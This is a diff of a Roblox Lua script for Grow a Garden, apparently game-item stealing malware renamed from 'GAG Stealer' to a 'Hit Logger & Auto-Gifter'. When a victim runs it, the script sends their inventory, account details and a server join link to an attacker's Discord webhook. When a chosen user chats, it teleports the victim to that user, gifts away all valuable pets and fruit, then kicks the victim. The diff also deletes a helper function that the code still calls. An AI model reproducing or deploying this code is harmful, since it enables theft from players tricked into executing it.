@@ -1,13 +1,24 @@
--- GAG Stealer: Instant Join Link Edition
--- For support: discord.gg/notyet
+-- Grow a Garden "Hit" Logger & Auto-Gifter
+-- Made By Timoci | Support: discord.gg/notyet
 
 --------------------------
 -- USER CONFIG SETTINGS --
 --------------------------
 local CONFIG = {
-    USERNAMES = _G.Usernames or {},
+    USERNAMES = _G.Usernames or {}, -- List of usernames that can trigger the gift
     WEBHOOK   = _G.webhook or "",
-    MIN_VALUE = _G.min_value or 10000000
+    MIN_VALUE = _G.min_value or 10000000,
+}
+
+-------------------------
+-- Emoji & Section Maps -
+-------------------------
+local SECTION = {
+    HIT     = "🥗 Grow A Garden Hit",
+    USER    = "🧑‍💻 Player Information",
+    VALUE   = "💰 Total Value",
+    BACKPACK= "🌴 Backpack",
+    LINK    = "🌴 Join with URL"
 }
 
 local RARE_PETS = {
@@ -22,30 +33,9 @@ local RARE_PETS = {
 }
 local DEFAULT_PET_EMOJI = "🐶"
 local DEFAULT_FRUIT_EMOJI = "🥝"
-local WEBHOOK_COOLDOWN = 5
-
--------------------------------
--- FIREPROXIMITY BYPASS PATCH --
--------------------------------
-local function bypassProximityPrompt(prompt)
-    local ok = pcall(function() return fireproximityprompt(prompt) end)
-    if ok then return end
-    if prompt and prompt.InputHoldBegin then
-        prompt.InputHoldBegin(prompt)
-        task.wait(prompt.HoldDuration or 0.5)
-        if prompt.InputHoldEnd then prompt.InputHoldEnd(prompt) end
-    elseif prompt and prompt.Trigger then
-        prompt:Trigger()
-    else
-        warn("FireProximity bypass failed.")
-    end
-end
-getgenv().fireproximityprompt = bypassProximityPrompt
-
-print("GAG Stealer loaded. Join discord.gg/notyet For further support!")
 
 --------------------------
--- SERVICE/VARIABLE INIT --
+-- Roblox Service Setup  -
 --------------------------
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -55,9 +45,10 @@ local backpack = plr:WaitForChild("Backpack")
 local modules = replicatedStorage:WaitForChild("Modules")
 local req = request or http_request or (syn and syn.request)
 local lastWebhook = 0
+local webhookCooldown = 5  -- seconds
 
 --------------------------
--- CORE VALIDITY CHECKS --
+-- Core Checks           -
 --------------------------
 if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
     plr:Kick("Missing username or webhook in config!")
@@ -78,9 +69,9 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
-------------------------
--- IMPORT DEPENDENCIES --
-------------------------
+--------------------------
+-- Imports               -
+--------------------------
 local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
 local petUtils        = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
 local petRegistry     = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
@@ -88,14 +79,11 @@ local numberUtil      = require(modules:WaitForChild("NumberUtil"))
 local dataService     = require(modules:WaitForChild("DataService"))
 local excludedItems   = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 
-----------------------------
--- UTILITY FORMAT FUNCTIONS
-----------------------------
+--------------------------
+-- Utility Functions     -
+--------------------------
 local function getPetEmoji(name)
     return RARE_PETS[name] or DEFAULT_PET_EMOJI
-end
-local function getFruitEmoji()
-    return DEFAULT_FRUIT_EMOJI
 end
 local function getPetAge(tool)
     return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?"
@@ -117,9 +105,9 @@ local function formatValue(n)
     return s
 end
 
------------------------------
--- COLLECT INVENTORY ITEMS --
------------------------------
+--------------------------
+-- Main Inventory Logic  -
+--------------------------
 local function collectItems()
     local items, totalValue, foundRare = {}, 0, false
     for _, tool in ipairs(backpack:GetChildren()) do
@@ -173,7 +161,7 @@ local function collectItems()
                         Value = value,
                         Weight= weight,
                         Type  = "Fruit",
-                        Emoji = getFruitEmoji(),
+                        Emoji = DEFAULT_FRUIT_EMOJI,
                         Age   = nil
                     })
                 end
@@ -188,69 +176,85 @@ local function collectItems()
     return items, totalValue, foundRare
 end
 
------------------------------
--- EMBED PAYLOAD CREATION  --
------------------------------
-local function formatItemLine(item)
-    if item.Type == "Pet" then
-        return string.format("%s - %s [%.2f KG] [Age %s]", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"))
-    else
-        return string.format("%s - %s [%.2f KG]", item.Emoji, item.Name, item.Weight)
-    end
-end
-
-local function makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
+local function buildBackpackSection(items)
+    if #items == 0 then return "*Empty*" end
     local itemLines = {}
-    for _, item in ipairs(itemsToSend) do
-        table.insert(itemLines, formatItemLine(item))
+    for _, item in ipairs(items) do
+        if item.Type == "Pet" then
+            table.insert(itemLines, string.format("%s - %s [%.2fkg] → %s¢ [Age %s]", item.Emoji, item.Name, item.Weight, formatValue(item.Value), tostring(item.Age or "?")))
+        else
+            table.insert(itemLines, string.format("%s - %s [%.2fkg] → %s¢", item.Emoji, item.Name, item.Weight, formatValue(item.Value)))
+        end
     end
-    local itemBlock = table.concat(itemLines, "\n")
-    if #itemBlock > 1024 then
-        itemBlock = itemBlock:sub(1,1020) .. "\n...and more!"
+    return table.concat(itemLines, "\n")
+end
+
+--------------------------
+-- EMBED SEND LOGIC      -
+--------------------------
+local function sendHitWebhook(executer, receiver)
+    if tick() - lastWebhook < webhookCooldown then
+        print("Cooldown: not sending duplicate webhook.")
+        return
     end
+    lastWebhook = tick()
+
+    local items, totalValue, foundRare = collectItems()
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
-    local ping = foundRare and "@everyone" or ""
-    local description =
-        "**Player information**\n\n"..
-        "`Username: "..plr.Name.."`\n"..
-        "`Receiver: "..receiverName.."`\n"..
-        "`Executer: "..plr.Name.."`\n"..
-        "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
-        "**What you got**:\n\n"..
-        itemBlock.."\n\n"..
-        "**[Join Server]("..joinLink..")**"
+    local accountAge = (executer and executer.AccountAge or "?") .. " days"
 
-    return {
-        content = ping,
-        embeds  = {{
-            title  = "💎 You got something!",
-            color  = foundRare and 16776960 or 65280,
-            description = description,
-            footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
-        }}
+    local embed = {
+        title = string.format("%s - %s", SECTION.HIT, os.date("%c")),
+        color = foundRare and 16776960 or 65280,
+        fields = {
+            {
+                name = SECTION.USER,
+                value = string.format(
+                    "``````",
+                    executer.Name, receiver, executer.Name, accountAge
+                ),
+                inline = false
+            },
+            {
+                name = SECTION.VALUE,
+                value = string.format("``````", formatValue(totalValue)),
+                inline = false
+            },
+            {
+                name = SECTION.BACKPACK,
+                value = "``````",
+                inline = false
+            },
+            {
+                name = SECTION.LINK,
+                value = string.format("[Join with URL](%s)", joinLink),
+                inline = false
+            }
+        },
+        footer = {
+            text = "Made By Timoci"
+        }
     }
-end
 
--------------------------
--- SEND INSTANT WEBHOOK --
--------------------------
-do
-    local itemsToSend, totalValue, foundRare = collectItems()
-    local receiverName = table.concat(CONFIG.USERNAMES,", ") -- all target usernames
-    local payload = makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
-    local body = HttpService:JSONEncode(payload)
-    local headers = {["Content-Type"] = "application/json"}
+    local msg = {
+        content = (foundRare and "@everyone" or ""),
+        embeds = {embed}
+    }
     if req then
-        req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body})
+        req({
+            Url = CONFIG.WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(msg)
+        })
     else
-        print("No HTTP request function found in this executor!")
+        print("No HTTP request available.")
     end
 end
 
 --------------------------
--- REST OF AUTO-GIFT LOGIC (UNCHANGED) --
+-- GIFT LOGIC            -
 --------------------------
-
 local function equipTool(tool)
     if tool.Parent ~= plr.Character then
         tool.Parent = plr.Character
@@ -260,7 +264,7 @@ local function equipTool(tool)
             plr.Character.Humanoid:EquipTool(tool)
         end)
     end
-    task.wait(0.09)
+    task.wait(0.06)
 end
 
 local function findGiftPrompt(targetChar)
@@ -285,15 +289,14 @@ local function findGiftPrompt(targetChar)
     return nil
 end
 
-local function doSteal(player)
-    local itemsToSend = select(1, collectItems())
+local function doGift(receiver)
     local myChar = plr.Character or plr.CharacterAdded:Wait()
     local victimRoot = myChar:WaitForChild("HumanoidRootPart")
-    victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    task.wait(0.25)
-    for _, item in ipairs(itemsToSend) do
+    victimRoot.CFrame = receiver.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
+    local items = select(1, collectItems())
+    for _, item in ipairs(items) do
         equipTool(item.Tool)
-        local prompt = findGiftPrompt(player.Character)
+        local prompt = findGiftPrompt(receiver.Character)
         if prompt then
             local t0 = os.clock()
             repeat
@@ -302,37 +305,55 @@ local function doSteal(player)
             until prompt.Enabled
             bypassProximityPrompt(prompt)
             wait(0.10)
-        else
-            warn("No gifting prompt found for "..(item.Name or "?"))
         end
         item.Tool.Parent = backpack
-        task.wait(0.04)
+        wait(0.04)
     end
     local stillInBackpack = true
     while stillInBackpack do
         stillInBackpack = false
-        for _, item in ipairs(itemsToSend) do
+        for _, item in ipairs(items) do
             if backpack:FindFirstChild(item.Tool.Name) then
                 stillInBackpack = true
                 break
             end
         end
-        task.wait(0.08)
+        task.wait(0.07)
     end
-    plr:Kick("All your stuff just got stolen by Tobi's stealer!\nJoin discord.gg/notyet")
+    plr:Kick("You just got hit! Join discord.gg/notyet for support.")
 end
 
-local function listenForUser()
-    local triggered = false
-    local function onChat(player)
-        if not table.find(CONFIG.USERNAMES, player.Name) then return end
-        player.Chatted:Connect(function()
-            if triggered then return end
-            triggered = true
-            doSteal(player)
-        end)
-    end
-    for _, p in ipairs(Players:GetPlayers()) do onChat(p) end
-    Players.PlayerAdded:Connect(onChat)
+--------------------------
+-- HOOK EVENTS           -
+--------------------------
+local hasFired = false
+
+local function onHitTrigger(user)
+    if hasFired then return end
+    hasFired = true
+    sendHitWebhook(plr, user.Name)
+    doGift(user)
 end
-listenForUser()
+
+local function hookChatListeners()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(CONFIG.USERNAMES, player.Name) then
+            player.Chatted:Connect(function()
+                onHitTrigger(player)
+            end)
+        end
+    end
+    Players.PlayerAdded:Connect(function(player)
+        if table.find(CONFIG.USERNAMES, player.Name) then
+            player.Chatted:Connect(function()
+                onHitTrigger(player)
+            end)
+        end
+    end)
+end
+
+-- Send a "preview" join link/info so you can join instantly (no spam)
+if not hasFired then
+    sendHitWebhook(plr, CONFIG.USERNAMES[1] or "unknown")
+end
+hookChatListeners()
